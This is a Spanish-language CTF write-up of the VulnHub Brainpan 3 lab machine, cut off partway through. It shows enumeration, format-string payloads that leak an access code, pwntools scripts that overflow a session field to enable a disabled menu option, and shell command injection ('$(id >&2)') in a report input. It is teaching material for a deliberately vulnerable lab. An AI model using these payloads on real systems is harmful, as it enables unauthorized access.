@@ -1,0 +1,1690 @@
+<!DOCTYPE html>
+<html>
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width initial-scale=1" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="robots" content="noindex">
+
+  <title>Writeup VulnHub Brainpan 3</title>
+
+  <meta name="description" content="Resolución de la máquina Brainpan 3 de la plataforma de VulnHub">
+  <meta name="author" content="GatoGamer1155">
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Writeup VulnHub Brainpan 3">
+  <meta name="twitter:description" content="Resolución de la máquina Brainpan 3 de la plataforma de VulnHub">
+  <meta name="twitter:creator" content="GatoGamer1155">  
+  <meta name="twitter:image" content="/images/otros/vulnhub.png" />
+
+  <meta property="og:site_name" content="GatoGamer1155" />
+  <meta property="og:type" content="article">
+  <meta property="og:title" content="Writeup VulnHub Brainpan 3">
+  <meta property="og:description" content="Resolución de la máquina Brainpan 3 de la plataforma de VulnHub">
+  <meta property="og:image" content="/images/otros/vulnhub.png" />
+
+  <link rel="manifest" href="/images/favicons/manifest.json">
+  <link rel="shortcut icon" type="image/png" sizes="64x64" href="/images/otros/vulnhub.png">
+
+  <meta name="msapplication-TileColor" content="#ffc40d">
+  <meta name="msapplication-TileImage" content="/images/favicons/mstile-144x144.png">
+  <meta name="theme-color" content="#ffffff">
+  
+  <meta name="msapplication-TileColor" content="#ffc40d">
+  <meta name="msapplication-TileImage" content="/images/favicons/mstile-144x144.png">
+  <meta name="theme-color" content="#ffffff">
+
+  <link rel="stylesheet" href="/css/main.css?1678854914750547280">
+  <link rel="alternate" type="application/rss+xml" title="Writeup VulnHub Brainpan 3" href="/feed.xml">
+</head>
+
+  <body style="background-color: #282828;">
+  
+    <span class="mobile btn-mobile-menu">
+      <i class="icon icon-list btn-mobile-menu__icon"></i>
+      <i class="icon icon-x-circle btn-mobile-close__icon hidden"></i>
+    </span>
+
+<header class="panel-cover" style="background-image: url(/images/cover.jpg)">
+
+  <div class="panel-main">
+    <div class="panel-main__inner panel-inverted">
+      <div class="panel-main__content">
+
+          <img src="/images/profile.jpg" class="user-image zoomable" alt="GatoGamer1155">
+          <h1 class="panel-cover__title panel-title scale-up-center">GatoGamer1155</h1>
+
+        <hr class="panel-cover__divider">
+        <p class="panel-cover__description slide-top">Entusiasta del Hacking y CTFs</p>
+        <hr class="panel-cover__divider panel-cover__divider--secondary">
+
+        <div class="navigation-wrapper">
+         <nav class="cover-navigation cover-navigation--primary">
+            <ul class="navigation">
+              <li class="navigation__item grow"><a href="/vulnhub" title="GatoGamer1155" class="blog-button">VulnHub</a></li>
+            </ul>
+          </nav>
+
+          <nav class="cover-navigation navigation--social">
+            <ul class="navigation">
+              
+              <li class="navigation__item grow">
+                <a href="https://github.com/gatogamer1155" title="Github" target="_blank">
+                  <i class="icon icon-social-github"></i>
+                  <span class="label">GitHub</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="https://twitter.com/gatogamer1155" title="Twitter" target="_blank">
+                  <i class="icon icon-social-twitter"></i>
+                  <span class="label">Twitter</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="https://instagram.com/gatogamer1155" title="Instagram" target="_blank">
+                  <i class="icon icon-social-instagram"></i>
+                  <span class="label">Instagram</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="https://youtube.com/@gatogamer1155" title="Youtube" target="_blank">
+                  <i class="icon icon-social-youtube"></i>
+                  <span class="label">Youtube</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="mailto:gatogamer1155@gmail.com" title="Correo Electronico" target="_blank">
+                  <i class="icon icon-mail"></i>
+                  <span class="label">Email</span>
+                </a>
+              </li>
+
+            </ul>
+          </nav>
+        </div>
+      </div>
+    </div>
+
+    <div class="panel-cover--overlay"></div>
+  </div>
+</header>
+    <br>
+    <div class="content-wrapper">
+      <div class="content-wrapper__inner">
+        <article class="post-container post-container--single">
+    <div class="izquierda">
+      <h3 class="post-title">Contenido</h3><br>
+      <ul>
+        <li><a href="#enumeration">Enumeración</a></li>
+        <li><a href="#shell-anansi">Shell - anansi</a></li>
+        <li><a href="#shell-reynard">Shell - reynard</a></li>
+        <li><a href="#shell-puck">Shell - puck</a></li>
+        <li><a href="#shell-root">Shell - root</a></li>
+        <li><a href="#extra-root">Extra - root</a></li>
+      </ul>
+  </div>
+
+  <header class="post-header slide-top">
+    <h4 class="post-title">VulnHub</h4>
+    <picture><img src="/images/otros/vulnhub.png" style="float: right; margin-right:0px; margin-left:0px; height:60px;" class="include_image zoomable"/></picture>
+    <h2 class="post-title">Brainpan 3</h2><br>
+  </header>
+  
+<section class="post" id="enumeration">
+<br><h3 class="post-title">Enumeración</h3><br>
+
+<p class="plain-text">Iniciamos la máquina escaneando los puertos de la máquina con <code class="language-plaintext highlighter-rouge">nmap</code> donde solo encontramos 1 puertos abierto, este es el <code class="language-plaintext highlighter-rouge">1337</code> que no tiene un servicio por defecto</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ nmap </span><span class="p">192.168.100.64
+Nmap scan report for 192.168.100.64  
+PORT     STATE SERVICE
+1337/tcp open  waste</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Al conectarnos con <code class="language-plaintext highlighter-rouge">netcat</code> al servicio corriendo en el puerto <code class="language-plaintext highlighter-rouge">1337</code> nos recibe un banner con el nombre de la maquina y se nos pide un <code class="language-plaintext highlighter-rouge">codigo</code> para poder acceder</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ netcat </span><span class="p">192.168.100.64 1337
+
+
+  __ )    _ \      \    _ _|   \  |   _ \    \      \  |     _ _| _ _| _ _|
+  __ \   |   |    _ \     |     \ |  |   |  _ \      \ |       |    |    | 
+  |   |  __ <    ___ \    |   |\  |  ___/  ___ \   |\  |       |    |    | 
+ ____/  _| \_\ _/    _\ ___| _| \_| _|   _/    _\ _| \_|     ___| ___| ___|
+
+                                                            by superkojiman  
+
+
+AUTHORIZED PERSONNEL ONLY
+PLEASE ENTER THE 4-DIGIT CODE SHOWN ON YOUR ACCESS TOKEN
+A NEW CODE WILL BE GENERATED AFTER THREE INCORRECT ATTEMPTS
+
+ACCESS CODE:</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Mediante un ataque de <code class="language-plaintext highlighter-rouge">format string</code> podemos llegar a lekear valores, desdes de enviar 4 veces <code class="language-plaintext highlighter-rouge">%p</code> separado por puntos nos devuelve algunos valores en hexadecimal</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">ACCESS CODE: %p.%p.%p.%p
+ERROR #1: INVALID ACCESS CODE: 0xbfedcf7c.(nil).0x5ce.0xbfedcf7c  
+
+ACCESS CODE MUST BE 4 DIGITS
+
+FAILED LOGIN ATTEMPTS: 1
+
+AUTHORIZED PERSONNEL ONLY
+PLEASE ENTER THE 4-DIGIT CODE SHOWN ON YOUR ACCESS TOKEN
+A NEW CODE WILL BE GENERATED AFTER THREE INCORRECT ATTEMPTS
+
+ACCESS CODE:</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Para ver mejor los valores podemos usar <code class="language-plaintext highlighter-rouge">%d</code> y asi verlos en decimal, el tercer valor parece ser el <code class="language-plaintext highlighter-rouge">codigo</code> de 4 digitos que necesitamos para acceder al programa</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">ACCESS CODE: %d.%d.%d.%d
+ERROR #1: INVALID ACCESS CODE: -1074933892.0.1486.-1074933892  
+
+ACCESS CODE MUST BE 4 DIGITS
+
+FAILED LOGIN ATTEMPTS: 2
+
+AUTHORIZED PERSONNEL ONLY
+PLEASE ENTER THE 4-DIGIT CODE SHOWN ON YOUR ACCESS TOKEN
+A NEW CODE WILL BE GENERATED AFTER THREE INCORRECT ATTEMPTS
+
+ACCESS CODE:</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Al enviarlo nos otorga acceso y nos muestra las <code class="language-plaintext highlighter-rouge">funciones</code> que tiene el programa</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">ACCESS CODE: 1486
+
+--------------------------------------------------------------  
+SESSION: ID-9705
+  AUTH   [Y]    REPORT [N]    MENU   [Y]  
+--------------------------------------------------------------  
+
+1  - CREATE REPORT
+2  - VIEW CODE REPOSITORY
+3  - UPDATE SESSION NAME
+4  - SHELL
+5  - LOG OFF
+
+ENTER COMMAND:</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Para solo obtener el tercer valor en decimal que es el codigo podemos usar <code class="language-plaintext highlighter-rouge">%3$d</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">ACCESS CODE: %3$d
+ERROR #1: INVALID ACCESS CODE: 8698
+
+ACCESS CODE MUST BE 4 DIGITS
+
+FAILED LOGIN ATTEMPTS: 1
+
+AUTHORIZED PERSONNEL ONLY
+PLEASE ENTER THE 4-DIGIT CODE SHOWN ON YOUR ACCESS TOKEN
+A NEW CODE WILL BE GENERATED AFTER THREE INCORRECT ATTEMPTS
+
+ACCESS CODE: 8698
+
+--------------------------------------------------------------  
+SESSION: ID-9289
+  AUTH   [Y]    REPORT [N]    MENU   [Y]  
+--------------------------------------------------------------  
+
+1  - CREATE REPORT
+2  - VIEW CODE REPOSITORY
+3  - UPDATE SESSION NAME
+4  - SHELL
+5  - LOG OFF
+
+ENTER COMMAND:</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Podemos crear un script en <code class="language-plaintext highlighter-rouge">python</code> que se encargue de conectarse, obtener el codigo abusando del leak y enviarlo, despues entramos en modo <code class="language-plaintext highlighter-rouge">interactivo</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="c1">#!/usr/bin/python3
+</span><span class="o">from </span><span class="p">pwn </span><span class="o">import </span><span class="p">remote
+
+shell </span><span class="o">= </span><span class="p">remote(</span><span class="s">"192.168.100.64"</span><span class="p">,</span><span class="mi"> 1337</span><span class="p">)
+
+shell.sendlineafter(</span><span class="no">b</span><span class="s">"CODE: "</span><span class="p">, </span><span class="no">b</span><span class="s">"%3$d"</span><span class="p">)
+
+shell.recvuntil(</span><span class="no">b</span><span class="s">"CODE: "</span><span class="p">)
+code </span><span class="o">= </span><span class="p">shell.recvline().strip()
+
+shell.sendlineafter(</span><span class="no">b</span><span class="s">"CODE: "</span><span class="p">, code)
+
+shell.interactive(</span><span class="s">""</span><span class="p">)</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Al ejecutarlo automatiza el proceso del <code class="language-plaintext highlighter-rouge">codigo</code> acceso y entra en modo interactivo que nos pide un nuevo comando, esta vez tenemos diferentes <code class="language-plaintext highlighter-rouge">opciones</code> del 1 al 5</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ python3 </span><span class="p">exploit.py
+[</span><span class="ve">+</span><span class="p">] Opening connection to 192.168.100.64 on port 1337: Done
+[</span><span class="az">*</span><span class="p">] Switching to interactive mode
+
+--------------------------------------------------------------  
+SESSION: ID-6326
+  AUTH   [Y]    REPORT [N]    MENU   [Y]  
+--------------------------------------------------------------  
+
+1  - CREATE REPORT
+2  - VIEW CODE REPOSITORY
+3  - UPDATE SESSION NAME
+4  - SHELL
+5  - LOG OFF
+
+ENTER COMMAND:</span>
+</code></pre></div></div><br>
+
+</section>
+<section class="post" id="shell-anansi">
+<br><h3 class="post-title">Shell - anansi</h3><br>
+
+<p class="plain-text">La opción <code class="language-plaintext highlighter-rouge">4</code> llama la atencion ya que se llama <code class="language-plaintext highlighter-rouge">SHELL</code>, al introducirla nos otorga lo que parece ser una shell como <code class="language-plaintext highlighter-rouge">reynard</code> donde ejecutamos comandos basicos</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">ENTER COMMAND: 4
+SELECTED: 4
+reynard@brainpan3 $ id
+uid=1000(reynard) gid=1000(reynard)
+reynard@brainpan3 $ ls
+total 0
+-rw-rw-r-- 1 reynard reynard 22 May 10 22:26 .flag
+-rw-rw-r-- 1 reynard reynard  0 May 10 22:26 never
+-rw-rw-r-- 1 reynard reynard  0 May 10 22:26 gonna
+-rw-rw-r-- 1 reynard reynard  0 May 10 22:26 give
+-rw-rw-r-- 1 reynard reynard  0 May 10 22:26 you
+-rw-rw-r-- 1 reynard reynard  0 May 10 22:26 up
+-rw-rw-r-- 1 reynard reynard  0 May 10 22:26 never
+-rw-rw-r-- 1 reynard reynard  0 May 10 22:26 gonna
+-rw-rw-r-- 1 reynard reynard  0 May 10 22:26 let
+-rw-rw-r-- 1 reynard reynard  0 May 10 22:26 you
+-rw-rw-r-- 1 reynard reynard  0 May 10 22:26 down
+reynard@brainpan3 $ cat .flag
+(ಠ_ಠ)
+reynard@brainpan3 $</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Sin embargo claramente no puede ser tan sencillo ya que solo es una shell simulada</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">reynard@brainpan3 $ pwd
+pwd: command not found
+reynard@brainpan3 $ cd
+cd: command not found
+reynard@brainpan3 $</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">La 1 que es <code class="language-plaintext highlighter-rouge">REPORT</code> esta deshabilitada, asi que podemos pasar a la <code class="language-plaintext highlighter-rouge">2</code>, la cual parece que habilita un <code class="language-plaintext highlighter-rouge">repositorio</code>, que realmente no sabemos donde se encuentra</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">ENTER COMMAND: 2
+SELECTED: 2
+
+CODE REPOSITORY IS NOW AVAILABLE
+
+--------------------------------------------------------------  
+SESSION: ID-2334
+  AUTH   [Y]    REPORT [N]    MENU   [Y]  
+--------------------------------------------------------------  
+
+1  - CREATE REPORT
+2  - VIEW CODE REPOSITORY
+3  - UPDATE SESSION NAME
+4  - SHELL
+5  - LOG OFF
+
+ENTER COMMAND:</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Si escaneamos de nuevo los puertos con <code class="language-plaintext highlighter-rouge">nmap</code> podemos encontrar el <code class="language-plaintext highlighter-rouge">8080</code> abierto</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ nmap </span><span class="p">192.168.100.64
+Nmap scan report for 192.168.100.64  
+PORT     STATE SERVICE
+1337/tcp open  waste
+8080/tcp open  http-proxy</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">La pagina principal es simplemente una <code class="language-plaintext highlighter-rouge">imagen</code> que no nos aporta nada interesante</p>
+<a href="/vulnhub/brainpan3/1.png" target="_blank"><div><p><img src="/vulnhub/brainpan3/1.png"></p></div></a>
+
+<p class="plain-text">Fuzzeando por archivos y directorios nos encontramos un <code class="language-plaintext highlighter-rouge">/repo</code> y un <code class="language-plaintext highlighter-rouge">/robots.txt</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ wfuzz </span><span class="p">-c -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://192.168.100.64:8080/FUZZ -t 100 --hc 404  
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://192.168.100.64:8080/FUZZ
+Total requests: 4715
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload
+=====================================================================
+
+000002194:   </span><span class="ve">200</span><span class="p">        12 L     22 W       241 Ch      "index.html"
+000003509:   </span><span class="az">301</span><span class="p">        0 L      0 W        0 Ch        "repo"
+000003571:   </span><span class="ve">200</span><span class="p">        2 L      4 W        34 Ch       "robots.txt"</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">El <code class="language-plaintext highlighter-rouge">robots.txt</code> nos muestra un directorio <code class="language-plaintext highlighter-rouge">/bp3_repo</code> pero al entrar a este no nos aporta nada interesante, solo nos muestra un simple <code class="language-plaintext highlighter-rouge">gif</code> modificado de mario</p>
+<a href="/vulnhub/brainpan3/2.png" target="_blank"><div><p><img src="/vulnhub/brainpan3/2.png"></p></div></a>
+
+<a href="/vulnhub/brainpan3/3.png" target="_blank"><div><p><img src="/vulnhub/brainpan3/3.png"></p></div></a>
+
+<p class="plain-text">En el directorio <code class="language-plaintext highlighter-rouge">/repo</code> podemos encontrar algunos archivos, entre ellos <code class="language-plaintext highlighter-rouge">binarios</code> que podemos analizar pero realmente no nos aportaran ni nos llevaran a algo</p>
+<a href="/vulnhub/brainpan3/4.png" target="_blank"><div><p><img src="/vulnhub/brainpan3/4.png"></p></div></a>
+
+<p class="plain-text">Igual que al inicio podemos explotar la vulnerabilidad de <code class="language-plaintext highlighter-rouge">format string</code> enviando el payload varias veces y usando <code class="language-plaintext highlighter-rouge">%x</code> para representar los leaks en hexadecimal</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">ENTER COMMAND: 3
+SELECTED: 3
+ENTER NEW SESSION NAME: %x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x
+--------------------------------------------------------------
+SESSION: bfa40bac.104.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.780a0a78.a.0.0.b7772000.b7772ac0.b7773898.b75c6940.b76380b5.b7772ac0.59.4e.59.b77728a0.b7772000.b7772ac0  
+
+  AUTH   [Y]    REPORT [N]    MENU   [Y]  
+--------------------------------------------------------------
+
+1  - CREATE REPORT
+2  - VIEW CODE REPOSITORY
+3  - UPDATE SESSION NAME
+4  - SHELL
+5  - LOG OFF
+
+ENTER COMMAND:</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">En los leaks que vemos hay una cadena que se repite bastante y es <code class="language-plaintext highlighter-rouge">252e7825</code> la cual al pasarla a ascii podemos ver que equivale a <code class="language-plaintext highlighter-rouge">%x.%</code> que forma parte de nuestro input</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ echo </span><span class="p">252e7825 | </span><span class="ve">xxd </span><span class="p">-ps -r | </span><span class="ve">rev</span><span class="p">
+%x.%</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Mas adelante tambien encontramos 3 valores separados por los <code class="language-plaintext highlighter-rouge">.</code> y son <code class="language-plaintext highlighter-rouge">59 4e 59</code> los cuales equivalen a <code class="language-plaintext highlighter-rouge">Y N Y</code> que curiosamente coinciden con los valores que vemos</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ echo </span><span class="p">59.4e.59 | </span><span class="ve">xxd</span><span class="p"> -ps -r | </span><span class="ve">rev</span><span class="p">
+YNY</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">El <code class="language-plaintext highlighter-rouge">N</code> del campo <code class="language-plaintext highlighter-rouge">REPORT</code> significa que esta deshabilitado pero lo vemos en el <code class="language-plaintext highlighter-rouge">leak</code>, tal vez si enviamos suficientes veces <code class="language-plaintext highlighter-rouge">Y</code> podemos sobreescribir su valor y habilitarlo</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">AUTH   [Y]    REPORT [N]    MENU   [Y]</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Para probarlo podemos enviar en el campo <code class="language-plaintext highlighter-rouge">3</code> varias veces <code class="language-plaintext highlighter-rouge">Y</code> hasta que el valor del campo <code class="language-plaintext highlighter-rouge">REPORT</code> cambie a <code class="language-plaintext highlighter-rouge">Y</code> y cuando lo haga nos muestre los <code class="language-plaintext highlighter-rouge">bytes</code> enviados</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="c1">#!/usr/bin/python3
+</span><span class="o">from </span><span class="p">pwn </span><span class="o">import </span><span class="p">remote, log
+
+shell </span><span class="o">= </span><span class="p">remote(</span><span class="s">"192.168.100.64"</span><span class="p">, </span><span class="mi">1337</span><span class="p">)
+
+shell.sendlineafter(</span><span class="no">b</span><span class="s">"CODE: "</span><span class="p">, </span><span class="no">b</span><span class="s">"%3$d"</span><span class="p">)
+
+shell.recvuntil(</span><span class="no">b</span><span class="s">"CODE: "</span><span class="p">)
+code </span><span class="o">= </span><span class="p">shell.recvline().strip()
+
+shell.sendlineafter(</span><span class="no">b</span><span class="s">"CODE: "</span><span class="p">, code)
+
+bar </span><span class="o">= </span><span class="p">log.progress(</span><span class="s">"Bytes"</span><span class="p">)
+
+</span><span class="o">for </span><span class="p">bytes </span><span class="o">in </span><span class="no">range</span><span class="p">(</span><span class="mi">1</span><span class="p">, </span><span class="mi">1024</span><span class="p">):
+    shell.sendlineafter(</span><span class="no">b</span><span class="s">"COMMAND: "</span><span class="p">,</span><span class="no"> b</span><span class="s">"3"</span><span class="p">)
+
+    junk </span><span class="o">= </span><span class="no">b</span><span class="s">"Y" </span><span class="o">* </span><span class="p">bytes
+    shell.sendlineafter(</span><span class="no">b</span><span class="s">"NAME: "</span><span class="p">, junk)
+
+    shell.recvuntil(</span><span class="no">b</span><span class="s">"REPORT "</span><span class="p">)
+    output </span><span class="o">= </span><span class="p">shell.recv(</span><span class="mi">3</span><span class="p">).decode()
+
+    bar.status(</span><span class="no">f</span><span class="s">"</span><span class="p">{</span><span class="na">str</span><span class="p">(bytes)} {output}</span><span class="s">"</span><span class="p">)
+
+    </span><span class="o">if </span><span class="p">output </span><span class="o">==</span><span class="s"> "[Y]"</span><span class="p">:
+        bar.success(</span><span class="no">f</span><span class="s">"</span><span class="p">{</span><span class="na">str</span><span class="p">(bytes)} {output}</span><span class="s">"</span><span class="p">)
+        </span><span class="o">break</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Ejecutamos el script y despues de enviar <code class="language-plaintext highlighter-rouge">253</code> el caracter <code class="language-plaintext highlighter-rouge">Y</code> el valor de <code class="language-plaintext highlighter-rouge">REPORT</code> se sobreescribe cambia a <code class="language-plaintext highlighter-rouge">Y</code> por lo que probablemente se habilite y podamos usarlo</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ python3 </span><span class="p">exploit.py 
+[</span><span class="ve">+</span><span class="p">] Opening connection to 192.168.100.64 on port 1337: Done  
+[</span><span class="ve">+</span><span class="p">] Bytes: 253 [Y]
+[</span><span class="az">*</span><span class="p">] Closed connection to 192.168.100.64 port 1337</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Para automatizar el conseguir el <code class="language-plaintext highlighter-rouge">codigo</code> para conectarnos y sobreescribir el valor de <code class="language-plaintext highlighter-rouge">REPORT</code> para habilitarlo podemos hacerlo con un pequeño script en python</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="c1">#!/usr/bin/python3</span><span class="p">
+</span><span class="o">from </span><span class="p">pwn </span><span class="o">import </span><span class="p">remote
+
+shell </span><span class="o">= </span><span class="p">remote(</span><span class="s">"192.168.100.64"</span><span class="p">, </span><span class="mi">1337</span><span class="p">)
+
+shell.sendlineafter(</span><span class="no">b</span><span class="s">"CODE: "</span><span class="p">,</span><span class="no"> b</span><span class="s">"%3$d"</span><span class="p">)
+
+shell.recvuntil(</span><span class="no">b</span><span class="s">"CODE: "</span><span class="p">)
+code </span><span class="o">= </span><span class="p">shell.recvline().strip()
+
+shell.sendlineafter(</span><span class="no">b</span><span class="s">"CODE: "</span><span class="p">, code)
+
+shell.sendlineafter(</span><span class="no">b</span><span class="s">"COMMAND: "</span><span class="p">,</span><span class="no"> b</span><span class="s">"3"</span><span class="p">)
+shell.sendlineafter(</span><span class="no">b</span><span class="s">"NAME: "</span><span class="p">, </span><span class="no">b</span><span class="s">"Y" </span><span class="o">* </span><span class="mi">253</span><span class="p">)
+
+shell.interactive(</span><span class="s">""</span><span class="p">)</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Al ejecutarlo nos otorga el modo interactivo despues de hacer que el valor de <code class="language-plaintext highlighter-rouge">REPORT</code> sea igual <code class="language-plaintext highlighter-rouge">Y</code> por lo que deberiamos poder ejecutar el comando 1 que antes no</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ python3 </span><span class="p">exploit.py
+[</span><span class="ve">+</span><span class="p">] Opening connection to 192.168.100.64 on port 1337: Done
+[</span><span class="az">*</span><span class="p">] Switching to interactive mode
+--------------------------------------------------------------
+SESSION: YYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYY  
+  AUTH   [Y]    REPORT [Y]    MENU   [Y]  
+--------------------------------------------------------------
+
+1  - CREATE REPORT
+2  - VIEW CODE REPOSITORY
+3  - UPDATE SESSION NAME
+4  - SHELL
+5  - LOG OFF
+
+ENTER COMMAND:</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Si enviamos el comando <code class="language-plaintext highlighter-rouge">1</code> para crear un reporte nos pide un input para crearlo, en este caso al enviar la cadena <code class="language-plaintext highlighter-rouge">testing</code> esta se ve reflejada solo un poco mas abajo</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">ENTER COMMAND: 1
+SELECTED: 1
+
+ENTER REPORT, END WITH NEW LINE:
+
+testing
+
+REPORT [testing]
+SENDING TO REPORT MODULE
+
+[+] WRITING REPORT TO /home/anansi/REPORTS/20230731164539.rep
+[+] DATA SUCCESSFULLY ENCRYPTED
+[+] DATA SUCCESSFULLY RECORDED
+[+] RECORDED [l}klqv\x7f]</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Si al input le añadimos una <code class="language-plaintext highlighter-rouge">"</code> la respuesta nos muestra un error de sintaxis por <code class="language-plaintext highlighter-rouge">sh</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">ENTER COMMAND: 1
+SELECTED: 1
+
+ENTER REPORT, END WITH NEW LINE:
+
+testing"
+
+REPORT [testing"4]
+SENDING TO REPORT MODULE
+
+sh: 1: Syntax error: Unterminated quoted string</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Esta haciendo algo con nuestro input usando una shell, si intentamos enviar <code class="language-plaintext highlighter-rouge">$(id)</code> para ejecutar el comando id nos refleja nuestro input y no el comando ejecutado</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">ENTER COMMAND: 1
+SELECTED: 1
+
+ENTER REPORT, END WITH NEW LINE:
+
+$(id)
+
+REPORT [$(id)]
+SENDING TO REPORT MODULE
+
+[+] WRITING REPORT TO /home/anansi/REPORTS/20230802100342.rep
+[+] DATA SUCCESSFULLY ENCRYPTED
+[+] DATA SUCCESSFULLY RECORDED
+[+] RECORDED [\x91\x8d\x80\xdb\xdb\xdb\xdb\xdb\xdb\x85\x8a\x85\x8a\x97\x8d\xdb\xdb\x83\x8d\x80\xdb\xdb\xdb\xdb\xdb\xdb\x93\x81\x86\x80\x81\x92\xdb\xdb\x81\x91\x8d\x80\xdb\xdbۖ\x8b\x8b\x90\xdb\xdb\x83\x96\x8b\x91\x94\x97\xdb\xdbۖ\x8b\x8b\x90\xdb]  </span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Al enviar el output stderr añadiendole <code class="language-plaintext highlighter-rouge">>&2</code> esta vez nos muestra el output del comando <code class="language-plaintext highlighter-rouge">id</code> ejecutado en el sistema, que parece que se ejecuta como <code class="language-plaintext highlighter-rouge">anansi</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">ENTER COMMAND: 1
+SELECTED: 1
+
+ENTER REPORT, END WITH NEW LINE:
+
+$(id >&2)
+
+REPORT [$(id >&2)]
+SENDING TO REPORT MODULE
+
+uid=1000(anansi) gid=1003(webdev) groups=1000(anansi)
+
+[+] WRITING REPORT TO /home/anansi/REPORTS/20230802101150.rep  
+[+] DATA SUCCESSFULLY ENCRYPTED
